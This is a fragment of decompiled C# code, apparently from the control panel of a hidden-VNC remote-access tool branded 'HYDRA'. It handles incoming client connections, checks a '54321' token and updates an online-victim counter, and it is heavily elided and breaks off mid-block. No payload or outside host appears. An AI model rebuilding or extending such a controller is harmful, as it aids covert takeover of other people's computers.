			...
			else
			{
				...
				new Thread((ThreadStart)checked(delegate
				{
					...
					try
					{
						...
						Clients.int_2 = 0;
						((Control)(object)new HYDRAUI().siticoneLabel2).Text = "0 Online";
					}
					catch
					{
					}
								...
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									...
									this.HVNCList.Invoke((MethodInvoker)delegate
									{
										lock (this._clientList)
										{
											...
											new Thread((ThreadStart)delegate
											{
												((Control)(object)hvnc.siticoneLabel2).Text = Conversions.ToString(Clients.int_2) + " Online";
											});
										}
									});
								}
							...
							if (this._clientList.Contains(tcpClient))
							{
								...
								lock (this._clientList)
								{
									try
									{
										...
										tcpClient.Close();
										Clients.int_2--;
										((Control)(object)new HYDRAUI().siticoneLabel2).Text = Conversions.ToString(Clients.int_2) + " Online";
										return;
									}
									catch (Exception)
									{
